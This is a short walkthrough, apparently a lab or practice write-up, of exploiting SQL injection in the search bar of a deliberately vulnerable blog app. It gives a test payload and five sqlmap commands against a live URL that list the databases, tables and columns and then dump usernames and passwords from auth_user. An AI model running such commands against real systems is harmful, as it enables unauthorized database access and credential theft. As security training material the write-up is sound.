# Sql injection 

## SQLI in Search bar

It might seem at first that the search variable will return exactly what was entered so insert a simple payload to check for SQLi `1or1=1-`
Surprisingly, the results returned all the articles in the application's data table

![image](https://user-images.githubusercontent.com/63194321/132503809-073c0af0-404a-4ea9-81b4-b16028215cdb.png)

### Solution
After determining that there is SQLI at this address, we will use sqlmap to scan and attack

B1. Start Sqlmap and enter command to scan for `sqli` vulnerabilities:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch`

![image](https://user-images.githubusercontent.com/63194321/132506775-bfe319ad-d1e6-4b7d-9535-31730048cc07.png)

B2. Define a list of databases:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch --dbs`

![image](https://user-images.githubusercontent.com/63194321/132508430-06ebfa6b-66a3-4e06-bd35-7857fab4a5f0.png)

B3. Identify the tables in the database:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch -D public -tables`

![image](https://user-images.githubusercontent.com/63194321/132508803-98a9a86f-dca3-419c-84c7-f284a535c659.png)

B4. Define columns in tables:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch -D public -T auth_user -columns`

![image](https://user-images.githubusercontent.com/63194321/132509383-9d885446-6ffb-4409-957a-ffeabfbac78e.png)

B5. Get the username and password values:

`sqlmap -u "https://blog-vul.herokuapp.com/search/?search=d&tagId=chiase" --batch -D public -T auth_user -C username, password --dump`

![image](https://user-images.githubusercontent.com/63194321/132510741-09017ecd-a95e-4cc5-8f45-b0129742314d.png)


